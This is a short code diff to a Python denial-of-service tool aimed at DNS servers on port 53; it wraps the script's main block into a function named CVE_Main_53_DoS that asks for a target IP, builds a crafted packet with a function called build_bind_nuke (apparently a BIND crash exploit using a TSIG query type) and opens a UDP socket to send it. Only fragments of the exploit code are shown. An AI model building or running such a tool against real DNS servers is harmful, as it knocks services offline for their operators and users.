@@ -3,9 +3,9 @@
 import socket
 import struct
 
-ip = input("Give an ip address of the target:")
+#ip = input("Give an ip address of the target:")
 
-trgt = (ip, 53)
+#trgt = (ip, 53)
 
 q_a = 1
 q_tsig = 250
@@ -61,7 +61,9 @@ def generate_padding(n):
 	return stringify(buckets[:4]), stringify(buckets[4:])
 
 
-if __name__=="__main__":
+def CVE_Main_53_DoS():
+	ip = input("Please, enter the address IP of the target:")
+	trgt = (ip, 53)
 	v = build_bind_nuke()
 
 	s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
